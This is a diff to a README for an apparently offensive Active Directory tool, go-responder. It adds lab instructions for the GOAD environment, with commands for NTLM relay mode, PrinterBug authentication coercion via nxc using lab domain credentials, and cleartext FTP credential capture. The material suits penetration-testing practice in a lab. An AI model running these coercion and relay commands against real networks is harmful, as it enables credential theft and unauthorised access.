@@ -152,6 +152,45 @@ sudo ./go-responder-linux-amd64 -i eth0 --relay --relay-to 10.10.10.50 --selecti
 sudo ./go-responder-linux-amd64 -i eth0 -db hashes.db -o hashes.txt
 ```
 
+### Testing against GOAD (Game of Active Directory)
+
+GOAD lab: `vboxnet6`, attacker IP `192.168.62.1`, WINTERFELL DC `192.168.62.11`, CASTELBLACK relay target `192.168.62.22`.
+
+**Terminal 1 — start go-responder in relay mode:**
+
+```
+sudo ./go-responder-linux-amd64 \
+    -i vboxnet6 \
+    -v \
+    -o /tmp/hashes.txt \
+    -db /tmp/hashes.db \
+    --relay \
+    --relay-to 192.168.62.22 \
+    --selective
+```
+
+**Terminal 2 — coerce WINTERFELL to authenticate via PrinterBug:**
+
+```
+nxc smb 192.168.62.11 \
+    -d north.sevenkingdoms.local \
+    -u eddard.stark \
+    -p 'FightP3aceAndHonor!' \
+    -M coerce_plus \
+    -o LISTENER=192.168.62.1 METHOD=Printerbug
+```
+
+The `WINTERFELL$` machine account authenticates to us and is relayed to CASTELBLACK.  
+Run the coerce command a second time to see `✓ KNOWN` (dedup in action).
+
+**Optional — trigger a cleartext FTP capture:**
+
+```
+ftp 192.168.62.1
+```
+
+Type any username and password at the prompt — the FTP cleartext card appears in Terminal 1.
+
 ### Capture output
 
 Each credential captured is rendered as a colour-coded card:
